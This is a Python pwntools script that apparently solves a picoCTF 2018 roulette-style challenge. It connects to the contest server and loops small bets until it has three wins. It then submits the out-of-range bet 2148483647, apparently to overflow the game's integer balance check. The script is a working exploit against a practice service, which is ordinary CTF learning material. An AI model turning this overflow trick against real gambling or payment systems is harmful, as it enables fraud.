#!/usr/bin/env python

from pwn import *

r = remote("2018shell2.picoctf.com", 21444)

win = [  "Wow.. Nice One!",
  "You chose correct!",
  "Winner!",
  "Wow, you won!",
  "Alright, now you're cooking!",
  "Darn.. Here you go",
  "Darn, you got it right.",
  "You.. win.. this round...",
  "Congrats!",
  "You're not cheating are you?"]

print r.recvuntil(">")

wins = 0
buf = ''

for i in xrange(3000):
	r.sendline("1") # bet 1
	r.sendline("3") # pick one
	buf = r.recvuntil(">")
	# print "buf, ", buf
	r.recvuntil(">")
	# r.recvuntil(">")
	if any(x in buf for x in win):
		wins += 1
		if wins >= 3:
			break
	print "wins ", wins

r.sendline("2148483647")
r.sendline("1")

print r.recvall()
r.interactive()
